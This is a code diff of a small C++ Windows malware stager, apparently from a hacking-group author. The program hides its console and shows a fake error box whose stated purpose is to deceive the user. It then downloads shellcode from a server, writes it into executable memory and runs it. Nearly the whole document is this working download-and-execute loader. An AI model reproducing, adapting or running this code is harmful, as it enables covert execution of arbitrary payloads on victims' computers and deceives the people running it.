@@ -1,9 +1,10 @@
-// Coded by s1ege greetz to all GSH members
+// Coded by s1ege greetz to all #GSH members.
 #include <winsock2.h>
 #include <windows.h>
 #include <iostream> 
 
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "user32.lib")
 #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 
 using namespace std;
@@ -11,30 +12,22 @@ using namespace std;
 int messagebox() {
 	int msgboxID = MessageBox(
 		NULL,
-		L"Error to throw off user. ",
-		L"Error:",
+		"Error to throw off user. ",
+		"Error:",
 		MB_ICONEXCLAMATION | MB_OK
 	);
 	return msgboxID;
 }
 
-int main() {
+void fetch(string server, string path) {
 	HINSTANCE hInst;
 	WSADATA wsaData;
 	SOCKADDR_IN SockAddr;
-	
-	// enter address hosting shellcode here..
-	string server = "127.0.0.1";
-	
-	// enter path to shellcode.txt file here..
-	string path = "/shellcode.txt";
-
 	char buf[8192];
 	string response;
 	unsigned char shellcode[8192];
 
 	// call message box function
-	messagebox();
 
 	// initialize winsock, create socket and connect to server
 	WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -60,11 +53,22 @@ int main() {
 	for (int i = 0; i < shellcode_str.size() / 4; ++i) {
 		shellcode[i] = strtoul(shellcode_str.substr(i * 4 + 2, 2).c_str(), nullptr, 16);
 	}
-
 	// allocate memory and execute shellcode in memory
 	void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	memcpy(exec, shellcode, sizeof(shellcode));
 	((void(*)())exec)();
+}
+
+int main() {
+	// enter address hosting shellcode here.
+	string server = "127.0.0.1";
 	
+	// enter path to shellcode.txt file here.
+	string path = "/shellcode.txt";
+
+	messagebox();
+	fetch(server, path);
+
 	return 0;
+
 }
